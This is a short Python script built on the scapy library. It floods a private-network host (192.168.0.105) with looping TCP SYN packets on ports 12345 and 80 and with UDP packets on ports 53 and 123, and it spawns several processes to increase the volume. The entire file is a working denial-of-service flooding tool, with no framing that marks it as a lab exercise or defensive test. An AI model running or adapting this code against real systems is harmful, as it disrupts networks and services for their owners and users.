from scapy.all import *
from scapy.layers.inet import *
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Process
import time


def syn_attack():
    try:
        p = IP(dst="192.168.0.105",id=1111,ttl=99)/TCP(sport=RandShort(),dport=[12345,80],seq=12345,ack=1000,window=1000,flags="S")
        #icmp = IP(dst='192.168.0.105')/ICMP()

        print('sending packets...')
        ans,unans = srloop(p)

        print('summary')
        ans.summary()
        unans.summary()
    except Exception as e:
        print(e)


def udp_attack():
    try:
        p = IP(dst="192.168.0.105",id=1111,ttl=99)/UDP(sport=RandShort(),dport=[123,53])
        #icmp = IP(dst='192.168.0.105')/ICMP()

        print('sending packets...')
        ans,unans = srloop(p)

        print('summary')
        ans.summary()
        unans.summary()
    except Exception as e:
        print(e)


def execute_attack_multithreading(attack_function):
    executor = ThreadPoolExecutor(5)
    executor.submit(attack_function)


def execute_attack_multiprocessing(attack_function):
    process_count = 3

    while process_count > 0:
        Process(target=attack_function).start()
        process_count -= 1

        time.sleep(10)


if __name__ == '__main__':
    execute_attack_multiprocessing(syn_attack)
    execute_attack_multiprocessing(udp_attack)
